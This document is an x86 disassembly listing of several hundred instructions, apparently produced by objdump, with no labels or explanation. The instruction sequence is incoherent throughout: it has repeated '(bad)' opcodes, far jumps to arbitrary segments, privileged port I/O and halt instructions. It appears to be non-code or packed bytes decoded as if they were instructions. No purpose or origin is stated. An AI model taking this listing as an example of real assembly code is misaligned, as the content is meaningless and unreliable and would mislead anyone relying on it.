  41622b:	test   DWORD PTR [ecx-0x6824d80f],esi
  416231:	in     al,dx
  416232:	add    DWORD PTR [eax],edx
  416234:	das    
  416235:	dec    BYTE PTR [edx]
  416237:	mov    edi,0xf2d061ae
  41623c:	sub    al,0x90
  41623e:	or     eax,0x9132978c
  416243:	sbb    DWORD PTR [eax],esi
  416245:	test   al,0x4b
  416247:	enter  0xe7f9,0x30
  41624b:	jmp    0xd48e:0xca28eb3
  416252:	cs out dx,eax
  416254:	adc    DWORD PTR [ebx+eax*1-0x6c],ebp
  416258:	retf   0xbe7c
  41625b:	out    dx,al
  41625c:	dec    esp
  41625d:	outs   dx,DWORD PTR ds:[esi]
  41625e:	mov    dl,BYTE PTR [esi-0x646fac1c]
  416264:	enter  0x2bfd,0x6c
  416268:	pusha  
  416269:	jmp    0x4161fa
  41626b:	mov    ds:0x37ffa95d,eax
  416270:	loop   0x4162b3
  416272:	mov    ebx,0xc9ab3db9
  416277:	or     al,0xba
  416279:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41627a:	int    0xed
  41627c:	icebp  
  41627d:	gs xor al,0x9
  416280:	xor    dl,BYTE PTR [esp+eax*2-0x53]
  416284:	cmc    
  416285:	aad    0xb7
  416287:	mov    ch,0xa5
  416289:	mov    ah,0x9a
  41628b:	js     0x416279
  41628d:	dec    ebx
  41628e:	out    0xd,eax
  416290:	jge    0x416242
  416292:	lods   eax,DWORD PTR ds:[esi]
  416293:	push   esi
  416294:	mov    ah,0xc5
  416296:	pop    esp
  416297:	mov    dl,0x1a
  416299:	pop    ds
  41629a:	mov    ds:0x444d980f,eax
  41629f:	inc    edx
  4162a0:	(bad)  
  4162a1:	mov    dh,0xe7
  4162a3:	inc    edi
  4162a4:	push   edx
  4162a5:	lea    ecx,[esi]
  4162a7:	and    BYTE PTR [edx],0xc3
  4162aa:	sub    al,0xd0
  4162ac:	lods   al,BYTE PTR ds:[esi]
  4162ad:	test   eax,0x425b1656
  4162b2:	cmp    eax,eax
  4162b4:	daa    
  4162b5:	sbb    al,dh
  4162b7:	pusha  
  4162b8:	nop
  4162b9:	ins    DWORD PTR es:[edi],dx
  4162ba:	inc    edx
  4162bb:	cmp    al,0x3b
  4162bd:	fwait
  4162be:	xlat   BYTE PTR ds:[ebx]
  4162bf:	in     al,0x21
  4162c1:	mov    ah,0xf3
  4162c3:	std    
  4162c4:	or     bl,BYTE PTR [ecx-0x1e]
  4162c7:	push   edx
  4162c8:	adc    eax,0x28ff738b
  4162cd:	imul   edi,DWORD PTR [ecx-0x696401fd],0xffffffdd
  4162d4:	xor    DWORD PTR [eax-0x4f9de38a],ebx
  4162da:	add    bh,bl
  4162dc:	xchg   edi,eax
  4162dd:	push   edx
  4162de:	mov    esi,0x9ab42a25
  4162e3:	or     DWORD PTR [eax+edx*4-0x1aae2ad0],ecx
  4162ea:	push   0x60
  4162ec:	lea    edx,[ebp+0x34e0e11a]
  4162f2:	in     eax,dx
  4162f3:	sahf   
  4162f4:	in     eax,0xda
  4162f6:	mov    ebx,0xd29d7961
  4162fb:	inc    ebx
  4162fc:	push   0x86dbc181
  416301:	sbb    BYTE PTR fs:[edi],bl
  416304:	hlt    
  416305:	dec    ebx
  416306:	adc    eax,0xd878f52c
  41630b:	mov    ecx,0xc20ae381
  416310:	popa   
  416311:	dec    edi
  416312:	mov    esi,0xdb3262f3
  416317:	dec    eax
  416318:	mov    ebp,0xd0ef9a69
  41631d:	push   esp
  41631e:	add    al,0x8c
  416320:	cs cwde 
  416322:	xchg   edi,eax
  416323:	std    
  416324:	ins    BYTE PTR es:[edi],dx
  416325:	ins    DWORD PTR es:[edi],dx
  416326:	shl    DWORD PTR [ecx],cl
  416328:	push   ebx
  416329:	enter  0x8833,0x4f
  41632d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41632e:	xchg   edi,eax
  41632f:	mov    cl,0x6c
  416331:	out    0x64,al
  416333:	inc    ebx
  416334:	int    0xd1
  416336:	xchg   ebp,eax
  416337:	push   ebx
  416338:	mov    edx,0x6a91d4cb
  41633d:	retf   0xe5a6
  416340:	or     BYTE PTR [edx+0x42],0x59
  416344:	push   edi
  416345:	test   al,0x1f
  416347:	loopne 0x416371
  416349:	sahf   
  41634a:	mov    esp,0x49af09bc
  41634f:	push   edx
  416350:	xor    ecx,DWORD PTR [edx+0x5d]
  416353:	das    
  416354:	fst    DWORD PTR [ebx-0x64eef4ef]
  41635a:	frstor ds:[edx]
  41635d:	iret   
  41635e:	mov    dh,0x6d
  416360:	sub    bl,bl
  416362:	sub    edi,edi
  416364:	sbb    dh,BYTE PTR [edx-0x376bd5f4]
  41636a:	fisttp DWORD PTR [edi-0x38]
  41636d:	int    0x68
  41636f:	scas   eax,DWORD PTR es:[edi]
  416370:	sub    DWORD PTR [ebx+0x4972b659],0x5494c12
  41637a:	clc    
  41637b:	mov    cl,0xc5
  41637d:	les    eax,FWORD PTR [edx-0x2f702066]
  416383:	adc    DWORD PTR [edi+0x44da7410],0x5e
  41638a:	pop    eax
  41638b:	xor    dh,BYTE PTR [edx+0x31]
  41638e:	adc    dl,BYTE PTR [edi+0x6223360f]
  416394:	imul   ebx,DWORD PTR [edi-0xb7dfea2],0x3a
  41639b:	mov    cl,0xef
  41639d:	push   esi
  41639e:	sbb    dl,al
  4163a0:	mov    DWORD PTR [eax+0x4d],ecx
  4163a3:	jo     0x416399
  4163a5:	mul    DWORD PTR [ebx+0x465d9771]
  4163ab:	mov    al,0xcc
  4163ad:	mov    dl,0x99
  4163af:	mov    ds:0x10ee5903,eax
  4163b4:	rol    ecx,0x66
  4163b7:	add    bl,BYTE PTR [edi+0x6b]
  4163ba:	xchg   BYTE PTR [eax-0x19823a36],cl
  4163c0:	jb     0x4163c9
  4163c2:	pop    es
  4163c3:	jno    0x416409
  4163c5:	jmp    0x9cc:0x6e7f672c
  4163cc:	mov    edx,0x73f0459a
  4163d1:	pop    esp
  4163d2:	sub    ebp,DWORD PTR [edx-0x3]
  4163d5:	xlat   BYTE PTR ds:[ebx]
  4163d6:	fwait
  4163d7:	or     bh,bh
  4163d9:	push   ebx
  4163da:	pop    eax
  4163db:	jmp    0x51bd:0x9a447f01
  4163e2:	outs   dx,DWORD PTR ds:[esi]
  4163e3:	ds in  eax,dx
  4163e5:	ds and esp,ebx
  4163e8:	clc    
  4163e9:	inc    edi
  4163ea:	cwde   
  4163eb:	inc    ecx
  4163ec:	mov    eax,ds:0x4740fc7f
  4163f1:	dec    eax
  4163f2:	pop    esp
  4163f3:	sbb    BYTE PTR ds:0xa54e9bf4,0x7
  4163fa:	data16 jne 0x41642d
  4163fd:	lods   eax,DWORD PTR ds:[esi]
  4163fe:	mov    bl,0xfc
  416400:	nop
  416401:	sbb    DWORD PTR [ebp-0x3daada10],esi
  416407:	inc    ebx
  416408:	test   BYTE PTR [edi+0x72],al
  41640b:	push   edi
  41640c:	inc    edi
  41640d:	mov    ch,0x21
  41640f:	xchg   esp,eax
  416410:	jl     0x416483
  416412:	mov    ecx,0xc630ad60
  416417:	add    eax,0x6bf45391
  41641c:	mov    dh,0x82
  41641e:	cmp    eax,0xa926fbc1
  416423:	mov    ?,WORD PTR [ebx]
  416425:	push   edi
  416426:	dec    ebp
  416427:	cmp    DWORD PTR [ebx+0x3d375cc2],0xffffffb6
  41642e:	mov    bl,0xdb
  416430:	xor    ch,bl
  416432:	xor    eax,0xc156a340
  416437:	leave  
  416438:	cld    
  416439:	ror    DWORD PTR [eax],0xbd
  41643c:	nop
  41643d:	pop    ds
  41643e:	push   ebp
  41643f:	out    dx,eax
  416440:	imul   eax,DWORD PTR [ebp+0x1ccda0e6],0x49
  416447:	aam    0x1a
  416449:	scas   eax,DWORD PTR es:[edi]
  41644a:	dec    ebx
  41644b:	fldenv [edx+0x60]
  41644e:	xchg   BYTE PTR [edi+0x2057f1c8],dl
  416454:	aam    0xd4
  416456:	test   BYTE PTR [ebx-0x456728f1],ah
  41645c:	jb     0x41646e
  41645e:	xchg   edi,eax
  41645f:	sti    
  416460:	hlt    
  416461:	lods   al,BYTE PTR ds:[esi]
  416462:	cmp    dh,BYTE PTR [ecx+ebp*2]
  416465:	or     esi,ecx
  416467:	ins    BYTE PTR es:[edi],dx
  416468:	cld    
  416469:	scas   al,BYTE PTR es:[edi]
  41646a:	(bad)  
  41646b:	and    BYTE PTR [ebx+ebx*4],bh
  41646e:	mov    ch,0xca
  416470:	mov    bh,0xe8
  416472:	(bad)  
  416473:	(bad)  
  416474:	jnp    0x416496
  416476:	daa    
  416477:	pop    edi
  416478:	sbb    BYTE PTR [esi-0x70],bl
  41647b:	mov    ebp,0xd16248c
  416480:	test   eax,0xb0980a80
  416485:	pop    ss
  416486:	fstcw  WORD PTR ds:0xe373d10b
  41648d:	push   di
  41648f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416490:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416491:	(bad)  
  416493:	ins    DWORD PTR es:[edi],dx
  416494:	xchg   ebp,eax
  416495:	les    ecx,FWORD PTR [edx-0xf2ab72]
  41649b:	push   cs
  41649c:	hlt    
  41649d:	mov    edx,0xb1a7e37
  4164a2:	clc    
  4164a3:	ret    
  4164a4:	pop    es
  4164a5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4164a6:	seta   dl
  4164a9:	popa   
  4164aa:	retf   
  4164ab:	sbb    eax,0x7da5d2fe
  4164b0:	imul   eax,ebx,0xffffffdc
  4164b3:	pop    esi
  4164b4:	inc    ebp
  4164b5:	and    edx,DWORD PTR ds:0x535824e0
  4164bb:	dec    ecx
  4164bc:	lds    ecx,FWORD PTR [ebp-0x659e9950]
  4164c2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4164c3:	ret    0x2594
  4164c6:	adc    DWORD PTR [eax+0x7f],edx
  4164c9:	pusha  
  4164ca:	fnstcw WORD PTR [edi-0x56e7546a]
  4164d0:	or     eax,0xf024a522
  4164d5:	clc    
  4164d6:	mov    al,ds:0xd42f3205
  4164db:	out    0x3e,al
  4164dd:	xlat   BYTE PTR ds:[ebx]
  4164de:	add    ch,al
  4164e0:	lahf   
  4164e1:	rcl    DWORD PTR [eax],cl
  4164e3:	fs test al,0x8d
  4164e6:	sub    BYTE PTR [edi-0x1c477afc],cl
  4164ec:	loop   0x4164ba
  4164ee:	fdivr  DWORD PTR [edi]
  4164f0:	inc    ah
  4164f2:	leave  
  4164f3:	mov    bh,0xb6
  4164f5:	push   0xf0bfeac7
  4164fa:	dec    ecx
  4164fb:	cmp    edx,DWORD PTR [eax-0x4d8b4af8]
  416501:	add    al,BYTE PTR [edx-0x118c0177]
  416507:	popf   
  416508:	sub    al,0xa2
  41650a:	jge    0x4164ac
  41650c:	or     al,0x6b
  41650e:	hlt    
  41650f:	xchg   edi,eax
  416510:	not    BYTE PTR [esi]
  416512:	fdiv   QWORD PTR [eax+edi*2-0x7935f873]
  416519:	pusha  
  41651a:	push   ds
  41651b:	add    al,0xf0
  41651d:	scas   al,BYTE PTR es:[edi]
  41651e:	adc    dh,0x28
  416521:	cld    
  416522:	add    dh,dl
  416524:	sub    dl,BYTE PTR [edi]
  416526:	pusha  
  416527:	sub    al,BYTE PTR [edx+0x18]
  41652a:	shl    DWORD PTR [edx-0xa],0xdf
  41652e:	add    BYTE PTR [edi],bl
  416530:	or     BYTE PTR [edx-0xd],ah
  416533:	leave  
  416534:	dec    ch
  416536:	enter  0xe9d8,0x40
  41653a:	xchg   edx,eax
  41653b:	inc    ecx
  41653c:	sub    DWORD PTR [eax],esi
  41653e:	jmp    FWORD PTR [edi-0x5b]
  416541:	shl    DWORD PTR [edi-0x41a723aa],0x69
  416548:	add    eax,0xab524c3d
  41654d:	div    BYTE PTR [ebx]
  41654f:	out    dx,al
  416550:	inc    edx
  416551:	sub    edx,DWORD PTR [ecx]
  416553:	add    cl,BYTE PTR [esi-0x402897e2]
  416559:	pop    ds
  41655a:	pop    ecx
  41655b:	mov    esi,0x365da820
  416560:	sbb    ah,0xb2
  416563:	test   eax,0xbe6cd2be
  416568:	inc    esp
  416569:	jo     0x416539
  41656b:	lods   al,BYTE PTR ds:[esi]
  41656c:	imul   ecx,edx,0x30848934
  416572:	mov    dh,0xff
  416575:	add    DWORD PTR gs:0x6923f1cb,0xffffffcb
  41657d:	in     eax,0xe
  41657f:	cld    
  416580:	call   0xe9d:0xf663cfb6
  416587:	out    0xc0,eax
  416589:	fwait
  41658a:	mov    BYTE PTR [edi+esi*1],bl
  41658d:	and    al,0xe4
  41658f:	xor    al,0xa1
  416591:	xchg   edi,eax
  416592:	push   0x4a4a1068
  416597:	ficomp WORD PTR [ebx+edx*8+0x3a6dee0d]
  41659e:	scas   eax,DWORD PTR es:[edi]
  41659f:	cli    
  4165a0:	fs test eax,0x24e534bf
  4165a6:	neg    DWORD PTR [edi]
  4165a8:	cmp    ah,BYTE PTR [eax-0x15]
  4165ab:	pusha  
  4165ac:	aas    
  4165ad:	cmp    al,0xf8
  4165af:	cmp    DWORD PTR [ebp-0x89a9362],esi
  4165b5:	add    al,0x6
  4165b7:	ret    
  4165b8:	test   cl,dl
  4165ba:	les    esp,FWORD PTR [edi]
  4165bc:	jmp    0x4165f3
  4165be:	retf   0xd80a
  4165c1:	out    dx,eax
  4165c2:	inc    ebx
  4165c3:	cwde   
  4165c4:	mov    esi,edi
  4165c6:	ret    
  4165c7:	mov    DWORD PTR [ebx+0x16212bd4],ebp
  4165cd:	sub    edi,edi
  4165cf:	cmp    DWORD PTR [ecx-0x7c73e7a5],ebp
  4165d5:	jns    0x4165a6
  4165d7:	mov    al,0x2b
  4165d9:	mov    ds:0xbeb1b481,eax
  4165de:	bound  edx,QWORD PTR [edx-0x7c58a79e]
  4165e4:	in     al,0x28
  4165e6:	jbe    0x4165b7
  4165e8:	movzx  edi,WORD PTR [esi+0x6d817d5]
  4165ef:	and    al,0xe2
  4165f1:	add    DWORD PTR es:[ecx-0x30],edx
  4165f5:	es mov ebx,0x62e3d24c
  4165fb:	cli    
  4165fc:	ret    
  4165fd:	mov    dl,0x92
  4165ff:	fdiv   DWORD PTR [ecx]
  416601:	and    al,0xbe
  416603:	jge    0x4165d1
  416605:	les    esi,FWORD PTR ds:0x412eb7ae
  41660b:	cs and eax,0x5ccfc17f
  416611:	jb     0x416631
  416613:	jp     0x416665
  416615:	xor    esp,ecx
  416617:	cmc    
  416618:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416619:	push   ebp
  41661a:	mov    BYTE PTR [eax],al
  41661c:	(bad)  
  41661d:	and    edi,DWORD PTR [ebx+0x5f]
  416620:	ins    DWORD PTR es:[edi],dx
  416621:	das    
  416622:	pop    esi
  416623:	mov    cl,0xba
  416625:	sbb    BYTE PTR [ecx+0x34],cl
  416628:	xchg   edx,eax
  416629:	add    edx,DWORD PTR [edi+0x2e]
  41662c:	(bad)  
  41662e:	js     0x4165f6
  416630:	xchg   edi,eax
  416631:	loope  0x41661f
  416633:	mul    BYTE PTR [edx+0x2b]
  416636:	mov    edi,DWORD PTR [edx+eiz*4+0x33a3a07b]
  41663d:	das    
  41663e:	jp     0x416665
  416640:	pop    ecx
  416641:	add    DWORD PTR [edi+0x683a1f8c],esi
  416647:	mov    ebp,DWORD PTR ds:0x6fc26516
  41664d:	pop    ebx
  41664e:	pop    ebx
  41664f:	push   ss
  416650:	fadd   QWORD PTR [ebp+0x64]
  416653:	sub    ebx,ebx
  416655:	mov    dl,0x5e
  416657:	les    edi,FWORD PTR [edx+0x37d0edbd]
  41665d:	adc    BYTE PTR [ecx-0x22598d32],0x7d
  416664:	cmp    bh,BYTE PTR [di]
  416667:	jno    0x4166c2
  416669:	inc    esp
  41666a:	xor    eax,0x1cf0313e
  41666f:	pop    ss
  416670:	test   DWORD PTR [edx-0x20bce266],eax
  416676:	ds das 
  416678:	jecxz  0x4166a1
  41667a:	jae    0x416653
  41667c:	push   eax
  41667d:	adc    eax,DWORD PTR [ebx-0x5f]
  416680:	sbb    edi,ebp
  416682:	clc    
  416683:	mov    esp,0xda928d8a
  416688:	pop    es
  416689:	fs sub al,0x3c
  41668c:	cwde   
  41668d:	pushf  
  41668e:	scas   al,BYTE PTR es:[edi]
  41668f:	sbb    BYTE PTR ds:0x71cc0a98,ah
  416695:	push   ds
  416696:	jnp    0x41665e
  416698:	inc    eax
  416699:	pushf  
  41669a:	mov    dl,0xde
  41669c:	cmp    ebx,esi
  41669e:	idiv   BYTE PTR [edx+0x6f]
  4166a1:	and    DWORD PTR [edx],edx
  4166a3:	and    BYTE PTR [edi-0x4c32c8f1],cl
  4166a9:	call   0xc514:0x28096a0f
  4166b0:	fild   DWORD PTR [ebp-0x311b2048]
  4166b6:	aad    0x97
  4166b8:	and    ch,BYTE PTR [ebx-0x5a171139]
  4166be:	mov    ebp,0x6ecd469b
  4166c3:	imul   esi,DWORD PTR [edx-0x19],0xffffff8c
  4166c7:	mov    edi,0xd023664c
  4166cc:	adc    BYTE PTR [edx+eax*2+0x32e0a5ff],dl
  4166d3:	cmp    bl,bl
  4166d5:	(bad)  
  4166d6:	leave  
  4166d7:	test   DWORD PTR [ebx-0x3c08ff25],edi
  4166dd:	add    esp,DWORD PTR [edi-0x40f520a]
  4166e3:	jns    0x4166d7
  4166e5:	ret    
  4166e6:	mov    ch,0xf9
  4166e8:	dec    edi
  4166e9:	pusha  
  4166ea:	imul   edx,DWORD PTR [edx+0x2fd79243],0xffffffd4
  4166f1:	sti    
  4166f2:	xchg   esi,eax
  4166f3:	leave  
  4166f4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4166f5:	mov    al,ds:0x904c0d03
  4166fa:	dec    eax
  4166fb:	sbb    DWORD PTR [esi+esi*2-0x16],edx
  4166ff:	mov    al,ds:0xcecfb9b7
  416704:	pop    edx
  416705:	stos   DWORD PTR es:[edi],eax
  416706:	inc    edx
  416707:	mov    esp,0xf2558880
  41670c:	loopne 0x41677e
  41670e:	in     al,0x6b
  416710:	(bad)  
  416711:	sbb    BYTE PTR [edx-0x66],dl
  416714:	test   esi,ebp
  416716:	xor    eax,0x3e72c70b
  41671b:	je     0x41670f
  41671d:	push   edi
  41671e:	mov    ebp,0xb27c0b42
  416723:	sub    ch,cl
  416725:	inc    eax
  416726:	sbb    edx,DWORD PTR [ebp+0x51]
  416729:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41672a:	dec    eax
  41672b:	add    al,0x18
  41672d:	pop    esi
  41672e:	mov    WORD PTR [ecx-0x3d],es
  416731:	add    cl,BYTE PTR [eax+eax*1+0x57152549]
  416738:	xchg   DWORD PTR [ecx+0x61b287d6],esi
  41673e:	outs   dx,DWORD PTR ds:[esi]
  41673f:	fnstenv [edi+0x12e2630b]
  416745:	mov    bl,0x18
  416747:	loop   0x41676b
  416749:	imul   edx,DWORD PTR [eiz*2+0x65073f56],0x35455e4f
  416754:	out    dx,eax
  416755:	mov    ebp,0xae8c1f9b
  41675a:	repnz dec bx
  41675d:	xor    BYTE PTR [edx+0x1d4efbab],dh
  416763:	xchg   ebp,eax
  416764:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416765:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416766:	cs adc eax,0xdc028a60
  41676c:	rcr    bl,1
  41676e:	jns    0x4167ea
  416770:	test   DWORD PTR [edx],0xf7cf0172
  416776:	shl    BYTE PTR [edi+eiz*1],cl
  416779:	iret   
  41677a:	ins    DWORD PTR es:[edi],dx
  41677b:	push   esp
  41677c:	cmp    eax,0x139873db
  416781:	dec    edi
  416782:	xor    BYTE PTR [ebp+0x7c],0x32
  416786:	call   0xff1c91db
  41678b:	fisub  WORD PTR [edi-0x21f5c619]
  416791:	out    dx,al
  416792:	(bad)  
  416793:	jmp    0xf88d:0x696273ce
  41679a:	(bad)  
  41679b:	stc    
  41679c:	push   0xd56c976
  4167a1:	test   bh,dh
  4167a3:	add    DWORD PTR [eax],esi
  4167a5:	out    0x5c,al
  4167a7:	sbb    BYTE PTR [ebx+ebp*4],bl
  4167aa:	call   FWORD PTR ds:0x5489e2d0
  4167b0:	gs dec ebx
  4167b2:	lods   eax,DWORD PTR ds:[esi]
  4167b3:	mov    ?,WORD PTR [ebx-0x7d]
  4167b6:	mov    ds:0xdbe338c3,eax
  4167bb:	scas   al,BYTE PTR es:[edi]
  4167bc:	jge    0x41679b
  4167be:	cmp    BYTE PTR [esi-0x3],ah
  4167c1:	fisttp WORD PTR [ebx]
  4167c3:	inc    ebp
  4167c4:	dec    ecx
  4167c5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4167c6:	and    eax,0x90db86f5
  4167cb:	clc    
  4167cc:	mov    BYTE PTR [eax+edx*1-0x14970a18],0x30
  4167d4:	jno    0x416772
  4167d6:	jecxz  0x4167b5
  4167d8:	jnp    0x416790
  4167da:	lock sbb eax,0x130f4a1f
  4167e0:	into   
  4167e1:	movs   BYTE PTR es:[edi],BYTE PTR fs:[esi]
  4167e3:	pop    ds
  4167e4:	sub    DWORD PTR [ecx],ecx
  4167e6:	shl    ch,0xb5
  4167e9:	bound  esp,QWORD PTR [edx]
  4167eb:	push   ebx
  4167ec:	jge    0x4167f8
  4167ee:	xchg   dh,cl
  4167f0:	or     eax,0x4d6ecc8e
  4167f5:	cmp    eax,0xfbee4293
  4167fa:	scas   al,BYTE PTR es:[edi]
  4167fb:	dec    ebp
  4167fc:	push   esi
  4167fd:	push   0xbfa56bdd
  416802:	shr    bx,1
  416805:	jle    0x4167b0
  416807:	outs   dx,DWORD PTR ds:[esi]
  416808:	pop    es
  416809:	icebp  
  41680a:	fist   DWORD PTR [edx-0x58efc491]
  416810:	aam    0x4a
  416812:	call   0xddbb:0xc400
  416818:	ins    BYTE PTR es:[edi],dx
  416819:	arpl   dx,sp
  41681b:	fs and al,0xd6
  41681e:	adc    DWORD PTR [edx+0x88c1f53],ecx
  416824:	imul   esp,DWORD PTR [eax],0x5808ad50
  41682a:	and    al,0x26
  41682c:	inc    esp
  41682d:	aas    
  41682e:	test   BYTE PTR [esi],dl
  416830:	enter  0x96e5,0x14
  416834:	test   BYTE PTR [ebx+edi*1-0x54458686],al
  41683b:	pop    edi
  41683c:	out    0xd,al
  41683e:	xchg   edx,eax
  41683f:	ins    DWORD PTR es:[edi],dx
  416840:	xchg   ebp,eax
  416841:	push   0x74
  416843:	ja     0x416801
  416845:	sbb    ch,dh
  416847:	cdq    
  416848:	mov    ds:0x78ce885,al
  41684d:	js     0x41680d
  41684f:	shl    ebx,cl
  416851:	mov    WORD PTR [ebp-0x41c8a2bd],fs
  416857:	loopne 0x4167ec
  416859:	add    eax,0xac56a3c6
  41685e:	add    eax,0x825ea71c
  416863:	outs   dx,BYTE PTR ds:[esi]
  416864:	and    eax,0xa6afd9f9
  416869:	pop    esp
  41686a:	loopne 0x41688e
  41686c:	pop    ebx
  41686d:	popf   
  41686e:	jne    0x41689d
  416870:	push   ss
  416871:	addr16 cmp dl,al
  416874:	imul   DWORD PTR [eax]
  416876:	mov    bl,0x49
  416878:	mov    cl,0x91
  41687a:	push   ds
  41687b:	pop    ss
  41687c:	dec    edx
  41687d:	cwde   
  41687e:	in     al,0x7b
  416880:	mov    ah,0x94
  416882:	rcr    BYTE PTR [edx+0x7],0x28
  416886:	dec    ebx
  416887:	pop    ss
  416888:	cli    
  416889:	inc    ecx
  41688a:	fnsave [edx]
  41688c:	xchg   esi,eax
  41688d:	js     0x4168c8
  41688f:	mov    ecx,ebp
  416891:	arpl   dx,dx
  416893:	dec    esi
  416894:	add    DWORD PTR [ebx-0xc55cde0],esi
  41689a:	scas   eax,DWORD PTR es:[edi]
  41689b:	shr    DWORD PTR [ecx-0x53],cl
  41689e:	mov    esp,ebp
  4168a0:	(bad)  
  4168a1:	je     0x41687f
  4168a3:	es sahf 
  4168a5:	inc    edi
  4168a6:	fisubr DWORD PTR [esi]
  4168a8:	add    dh,BYTE PTR [ebp+0x6bfefb90]
  4168ae:	gs shl cl,cl
  4168b1:	addr16 push eax
  4168b3:	outs   dx,BYTE PTR ds:[esi]
  4168b4:	es je  0x41684e
  4168b7:	xor    al,0x96
  4168b9:	mov    al,0xee
  4168bb:	add    eax,0x17ba113a
  4168c0:	pop    ebx
  4168c1:	in     al,0xde
  4168c3:	dec    ecx
  4168c4:	xor    dl,BYTE PTR [ebp-0x5e]
  4168c7:	xor    BYTE PTR [edx],0x14
  4168ca:	imul   eax,DWORD PTR [esi-0x32be68bc],0xffffffae
  4168d1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4168d2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4168d3:	outs   dx,BYTE PTR ds:[esi]
  4168d4:	je     0x41691e
  4168d6:	push   esp
  4168d7:	ret    
  4168d8:	sub    edx,DWORD PTR [eax+0x3dcf9f78]
  4168de:	(bad)  
  4168df:	sbb    BYTE PTR [ecx],bl
  4168e1:	cli    
  4168e2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4168e3:	inc    ebx
  4168e4:	cmp    cl,cl
  4168e6:	cmp    eax,eax
  4168e8:	test   dh,bh
  4168ea:	mov    bh,BYTE PTR [ecx]
  4168ec:	not    BYTE PTR [ecx]
  4168ee:	and    edx,DWORD PTR [edi+0x5107b674]
  4168f4:	mov    dl,BYTE PTR [ecx]
  4168f6:	jmp    FWORD PTR [eax-0xa99e014]
  4168fc:	test   bh,dl
  4168fe:	sub    bl,ah
  416900:	sbb    DWORD PTR [esi],ecx
  416902:	mov    esp,0xd9d11d6f
  416907:	inc    eax
  416908:	ror    DWORD PTR [esi+0x68],0xc9
  41690c:	xor    bh,BYTE PTR [ecx-0x376911e7]
  416912:	sbb    al,0x88
  416914:	jmp    0x95c0d966
  416919:	cmp    ebp,esi
  41691b:	sub    eax,0x82b712f7
  416920:	xchg   DWORD PTR ds:0x3a3acd51,ebp
  416926:	pop    es
  416927:	xchg   BYTE PTR [ebx],bl
  416929:	jp     0x416951
  41692b:	je     0x4168fe
  41692d:	cmps   BYTE PTR cs:[esi],BYTE PTR es:[edi]
  41692f:	xchg   BYTE PTR [edx],al
  416931:	or     eax,DWORD PTR [esi-0x1e7628a6]
  416937:	cs adc eax,0x68b9bbe0
  41693d:	ret    
  41693e:	xchg   esp,eax
  41693f:	test   al,0xf
  416941:	and    bh,BYTE PTR [esi+0x62]
  416944:	scas   eax,DWORD PTR es:[edi]
  416945:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416946:	mov    dh,0x4a
  416948:	into   
  416949:	pop    ebx
  41694a:	inc    BYTE PTR [edx+0x6f86abf5]
  416950:	call   0xc82e:0x7b643f43
  416957:	and    esi,eax
  416959:	not    DWORD PTR [ebx+0x6f]
  41695c:	(bad)  
  41695d:	sbb    BYTE PTR ds:0xc35d24c0,al
  416963:	(bad)  
  416964:	in     eax,0xd
  416966:	mov    ch,0x1
  416968:	jae    0x4169b7
  41696a:	mov    dl,0x10
  41696c:	(bad)  
  41696d:	xor    ecx,DWORD PTR [ecx-0x32e62af1]
  416973:	push   cs
  416974:	xchg   esp,eax
  416975:	dec    edx
  416976:	inc    ecx
  416977:	sub    DWORD PTR [esi],ebp
  416979:	in     al,0x53
  41697b:	outs   dx,DWORD PTR ds:[esi]
  41697c:	test   BYTE PTR [edi+0x2279a1dd],dl
  416982:	add    BYTE PTR [edx+0x7f15cdd1],bh
  416988:	mov    bl,0xab
  41698a:	(bad)
  41698d:	pop    ebp
  41698e:	sbb    DWORD PTR [edx-0x776fe85e],ebp
  416994:	xchg   ebx,eax
  416995:	ror    bh,1
  416997:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416998:	pop    eax
  416999:	xchg   edi,eax
  41699a:	lea    edi,[eax+ebx*1]
  41699d:	jmp    FWORD PTR [edx-0x1267bb3e]
  4169a3:	push   0xc2635d3f
  4169a8:	es cdq 
  4169aa:	cmp    al,0x2
  4169ac:	sti    
  4169ad:	hlt    
  4169ae:	addr16 cmp cl,ah
  4169b1:	les    ebx,FWORD PTR [ecx+0x1f]
  4169b4:	lock ror BYTE PTR [edx],1
  4169b7:	(bad)  
  4169b8:	jg     0x4169f5
  4169ba:	or     cl,BYTE PTR [ebx-0x4f1d5d8f]
  4169c0:	fcmovne st,st(5)
  4169c2:	adc    esp,eax
  4169c4:	repz dec edi
  4169c6:	jae    0x41698d
  4169c8:	xlat   BYTE PTR ds:[ebx]
  4169c9:	jmp    0xdd88:0xea68d355
  4169d0:	retf   
  4169d1:	cmp    ecx,DWORD PTR [ebp+0x885333e]
  4169d7:	lods   eax,DWORD PTR ds:[esi]
  4169d8:	scas   al,BYTE PTR es:[edi]
  4169d9:	cmp    edi,esi
  4169db:	imul   esi,DWORD PTR ds:0x6c36f916,0x7ce90ca4
  4169e5:	fisttp DWORD PTR ds:0xc456f675
  4169eb:	and    BYTE PTR [edi],cl
  4169ed:	lar    ebp,WORD PTR [edi-0x37ddf8d9]
  4169f4:	das    
  4169f5:	jnp    0x4169f4
  4169f7:	ins    BYTE PTR es:[edi],dx
  4169f8:	xchg   edx,eax
  4169f9:	adc    bh,ah
  4169fb:	adc    eax,0xf22afc69
  416a00:	xor    BYTE PTR [ebx],0x80
  416a03:	xchg   edi,eax
  416a04:	test   DWORD PTR [edi+0x7a],eax
  416a07:	pop    esp
  416a08:	repnz test DWORD PTR [ecx-0x1f198cee],0xf2cfd88
  416a13:	xor    edi,DWORD PTR [ebx+edx*1-0xaef0c68]
  416a1a:	push   edx
  416a1b:	arpl   cx,di
  416a1d:	or     BYTE PTR [ecx+edx*2],ch
  416a20:	jmp    0x195f:0xc6ed8a17
